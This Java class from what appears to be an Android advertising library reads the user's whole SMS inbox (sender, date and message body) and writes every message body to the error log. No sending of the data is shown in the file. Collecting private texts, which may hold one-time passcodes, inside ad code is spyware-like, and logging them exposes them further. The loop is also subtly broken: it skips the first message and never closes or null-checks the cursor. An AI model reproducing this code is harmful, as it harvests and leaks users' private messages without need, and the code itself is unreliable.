package com.example.taashaadslib.AdSerever;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.example.taashaadslib.AlertUtils.AlertClasses;
import com.example.taashaadslib.ModelClasses.SMSData;

import java.util.ArrayList;

public class FetchUserSMSinboxClass {

    public static ArrayList<SMSData.DataBean> fetchInbox(Context mContext)
    {
        ArrayList<SMSData.DataBean> smsData = new ArrayList<>();

        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = mContext.getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"},null,null,null);


        cursor.moveToFirst();
        while  (cursor.moveToNext())
        {
            String address = cursor.getString(1);
            String body = cursor.getString(3);
            String date = cursor.getString(2);

            SMSData.DataBean mDatabean = new SMSData.DataBean();
            mDatabean.setDate(date);
            mDatabean.setSender(address);
            mDatabean.setSmsContent(body);

            smsData.add(mDatabean);

        }

        for (int i =0 ; i<smsData.size() ; i++){
            AlertClasses.printLogE("SMS LIST IN CLASS", smsData.get(i).getSmsContent());
        }

        return smsData;

    }
}
